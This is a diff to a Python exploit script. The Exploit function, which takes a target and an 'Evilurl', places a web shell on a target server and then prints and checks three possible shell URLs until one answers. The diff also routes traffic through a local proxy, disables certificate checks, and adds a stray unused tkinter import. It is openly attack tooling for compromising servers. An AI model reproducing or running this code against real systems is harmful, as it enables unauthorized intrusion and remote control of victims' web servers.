@@ -1,3 +1,4 @@
+from tkinter import S
 import requests
 import json
 import sys
@@ -9,6 +10,11 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 headers = {
 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0"
 }
+proxies={
+"http":"http://127.0.0.1:8080",
+"https":"https://127.0.0.1:8080"
+}
+
 
 def Exploit(Target,Evilurl,Type):
     try:
@@ -25,19 +31,30 @@ def Exploit(Target,Evilurl,Type):
         if "state" not in str(response.content,encoding='utf-8'):
             print("[!]Exploit failed!")
             exit()
+        slist= []
         jsonRes = json.loads(str(response.content,encoding='utf-8'))
-        shell = "{}://{}{}".format(urlparse(Target).scheme,urlparse(Target).netloc,jsonRes['list'][0]['url'])
-        print("\r\n[*]Exploit successfuly!\r\n[*]Shell: "+ shell)
+        shell1 = "{}://{}/{}".format(urlparse(Target).scheme,urlparse(Target).netloc,jsonRes['list'][0]['url'])
+        shell2 = "{}/{}".format(Target,jsonRes['list'][0]['url'])
+        shell3 = "{}/{}".format(Target[:Target.rfind("/")],jsonRes['list'][0]['url'])
+        slist.append(shell1)
+        slist.append(shell2)
+        slist.append(shell3)
+        print("\r\n[*]Exploit successfuly!")
+        print("[+] position 1 : " + shell1)
+        print("[+] position 2 : " + shell2)
+        print("[+] position 2 : " + shell3)
         print("[*]Verifying.....")
-        verify = requests.get(
-            url=shell,
-            headers=headers,
-            verify=False
-        )
-        if verify.status_code in [404,403]:
-            print("[!]Verify failed, please manual verify!")
-            exit()
-        print("[*]Verify successfuly!")
+        for s in slist:
+            verify = requests.get(
+                url=s,
+                headers=headers,
+                verify=False
+            )
+            if verify.status_code == 200:
+                print("[*]Verify successfuly!")
+                print("[*] " + s)
+                exit()
+            print("[-] Position {} verify failed!".format(slist.index(s)+1))
     except Exception as e:
         print(e)
     
